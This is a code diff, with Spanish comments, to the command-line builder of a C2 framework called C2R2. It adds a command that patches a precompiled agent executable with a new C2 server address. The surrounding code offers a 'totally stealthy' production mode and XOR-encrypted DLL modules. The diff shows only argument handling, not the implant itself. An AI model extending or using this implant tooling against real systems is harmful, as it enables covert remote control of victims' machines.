@@ -2,10 +2,12 @@
 
 mod encrypt;
 mod dll_encrypt;
+mod patch;
 
 use clap::{Parser, Subcommand};
 use encrypt::generate_agent;
 use dll_encrypt::{encrypt_dll, generate_random_key, xor_encrypt};
+use patch::patch_agent_binary;
 use std::path::PathBuf;
 use std::env;
 use std::fs;
@@ -20,7 +22,7 @@ struct Args {
 
 #[derive(Subcommand)]
 enum Commands {
-    /// Genera un agente para el C2
+    /// Genera un agente para el C2 (requiere código fuente y Rust)
     BuildAgent {
         /// Nombre del agente generado (sin extensión .exe)
         #[arg(short, long)]
@@ -33,6 +35,21 @@ enum Commands {
         /// Modo producción (sin consola, sin debug prints, totalmente stealthy)
         #[arg(short, long)]
         production: bool,
+    },
+    
+    /// Parchea un agente pre-compilado con nueva IP/Puerto (NO requiere Rust)
+    PatchAgent {
+        /// Archivo agente.exe de entrada
+        #[arg(short, long, default_value = "agent/agent.exe")]
+        input: String,
+        
+        /// Archivo de salida
+        #[arg(short, long)]
+        output: String,
+        
+        /// Servidor C2 (IP:Puerto)
+        #[arg(short, long)]
+        server: String,
     },
     
     /// Encripta un módulo DLL para ser usado por el agente
@@ -72,6 +89,25 @@ fn main() {
             match generate_agent(&name, &server, production) {
                 Ok(_) => {
                     println!("✅ Agente generado exitosamente: {}.exe", name);
+                }
+                Err(e) => {
+                    eprintln!("❌ Error: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        }
+        
+        Commands::PatchAgent { input, output, server } => {
+            println!("🔧 C2R2 Agent Patcher v2.0");
+            println!("📥 Input: {}", input);
+            println!("📤 Output: {}", output);
+            println!("🌐 Servidor C2: {}", server);
+            println!("{}", "-".repeat(50));
+            
+            match patch_agent_binary(&input, &output, &server) {
+                Ok(_) => {
+                    println!("✅ Agente parcheado exitosamente!");
+                    println!("   Puedes ejecutar {} directamente", output);
                 }
                 Err(e) => {
                     eprintln!("❌ Error: {}", e);
